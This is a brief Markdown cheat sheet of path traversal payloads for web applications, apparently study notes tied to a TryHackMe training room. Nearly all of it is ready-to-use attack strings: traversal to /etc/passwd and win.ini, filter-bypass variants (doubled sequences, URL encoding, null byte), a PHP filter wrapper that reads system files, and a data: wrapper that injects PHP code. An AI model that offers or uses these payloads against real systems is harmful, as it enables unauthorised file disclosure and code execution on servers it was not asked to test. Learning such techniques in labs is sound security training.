# Path Traversal Cheat Sheet
___
#### Common Method
```txt
../../../etc/passwd >> For linux

..\..\..\windows\win.ini >> For windows
```
#### Bypassing Defence Mechanism
```txt
Sequence block bypass >> ....//....//....//....//etc/passwd
Encoding ../ >> %2e%2e%2f
Absolute path >> /var/www/images/../../../etc/passwd
Using null byte >> ../../../etc/passwd%00.png
Using PHP wrappers >> php://filter/convert.base64-encode/resource=/etc/passwd
Using Data wrappers >> data:text/plain,<?php phpinfo(); ?>
```
## To learn
https://tryhackme.com/r/room/filepathtraversal
